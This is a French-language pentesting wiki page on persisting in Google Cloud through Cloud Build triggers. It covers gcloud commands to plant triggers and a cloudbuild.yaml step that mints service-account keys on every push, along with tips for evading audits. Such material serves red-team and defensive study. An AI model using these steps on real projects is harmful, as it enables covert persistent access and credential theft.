---
title: "Déclencheurs de build : des déclencheurs de dépôt qui s'exécutent en tant que compte de service de build"
description: "Déposer ou modifier des déclencheurs Cloud Build liés à un dépôt pour que les pushs exécutent des étapes de build de l'attaquant en tant que compte de service de build."
keywords:
  - déclencheurs de build
  - Cloud Build
  - dépôt
  - déclencheur de push
  - persistance
---

# Déclencheurs de build

Un **déclencheur** Cloud Build lance un build lorsqu'un événement de dépôt se produit (un push, un tag, une pull request). Déposer ou modifier un déclencheur, ou committer un `cloudbuild.yaml` que le déclencheur exécute déjà, transforme une activité ordinaire du dépôt en exécution récurrente en tant que compte de service Cloud Build, ce qui en fait une persistance durable plutôt qu'un build unique.

## Déposer un déclencheur

```bash
gcloud builds triggers create github \
  --repo-name <repo> --repo-owner <org> --branch-pattern '^main$' \
  --build-config cloudbuild.yaml
# or point an existing trigger at an attacker-controlled config
gcloud builds triggers list
gcloud builds triggers describe <trigger>
```

## Persistance via la configuration

```yaml
# a cloudbuild.yaml committed to the watched repo re-establishes access on every push
steps:
  - name: gcr.io/cloud-builders/gcloud
    args: ['iam','service-accounts','keys','create','k.json','--iam-account','<target-sa>']
```

## Notes d'exploitation

- Le déclencheur s'exécute en tant que compte de service Cloud Build (souvent Editor), de sorte que ses étapes peuvent générer des clés, ajouter des liaisons IAM ou déployer des ressources sans élévation supplémentaire.
- Un déclencheur est plus discret que des builds manuels répétés : il se fond dans la CI normale et continue de se déclencher une fois votre accès interactif disparu.
- Modifier la source de configuration ou les substitutions d'un déclencheur existant est plus furtif que de créer un nouveau déclencheur qui ressort dans un audit.

## Outils

- **gcloud** (`builds triggers create/update/describe/list`).

## Références

- [HackTricks Cloud : persistance Cloud Build GCP](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/index.html)
- [Rhino Security Labs : élévation de privilèges GCP](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)
- [Google : déclencheurs Cloud Build](https://cloud.google.com/build/docs/automating-builds/create-manage-triggers)
